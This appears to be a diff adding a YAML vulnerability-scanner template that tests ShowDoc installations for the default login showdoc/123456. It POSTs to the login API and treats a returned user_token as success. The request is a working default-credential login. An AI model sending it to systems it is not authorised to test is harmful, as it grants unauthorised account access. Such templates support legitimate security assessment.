@@ -1,0 +1,18 @@
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+  - https://blog.star7th.com/2016/05/2007.html
+expression: r0()
+manual: true
+name: poc-yaml-showdoc-default-password
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"uid") && response.body.bcontains(b"groupid")
+      && response.body.bcontains(b"user_token")
+    request:
+      body: username=showdoc&password=123456
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /server/index.php?s=/api/user/login
+transport: http
